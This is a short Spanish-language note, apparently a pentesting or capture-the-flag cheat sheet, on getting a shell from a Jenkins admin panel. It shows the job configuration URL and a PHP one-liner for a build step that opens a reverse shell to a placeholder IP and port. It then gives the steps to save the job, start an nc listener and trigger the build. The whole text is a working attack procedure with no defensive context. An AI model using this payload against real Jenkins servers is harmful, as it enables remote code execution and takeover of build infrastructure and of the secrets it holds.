## Dentro del panel admin jenkins
```bash
https://domain/user/my-views/view/all/job/admin/configure
```

En build steps: 

```php
php -r '$sock=fsockopen("<IP>",<PORT>);shell_exec("sh <&3 >&3 2>&3");'
```

Apply y Save

Mientras esta nc en escucha 

Click en Build Now
